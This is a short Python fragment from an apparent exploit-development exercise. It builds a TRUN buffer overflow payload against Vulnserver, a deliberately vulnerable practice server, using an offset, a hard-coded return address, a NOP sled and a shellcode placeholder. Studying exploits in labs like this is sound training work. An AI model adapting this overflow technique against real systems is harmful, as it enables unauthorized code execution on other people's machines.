...
host="192.168.56.102" #Use Ip address of machine Vulnserver is installed
port=8899 #Port assigned for vulnserver
...
buffer = "TRUN /.:/" + "D" * 2003 + "\xcd\x73\xa3\x77" + "\x90" * 16 +  buf + "s" * (5060 - 2003 - 4 - 16 - len(buf)) #buffer to be modified
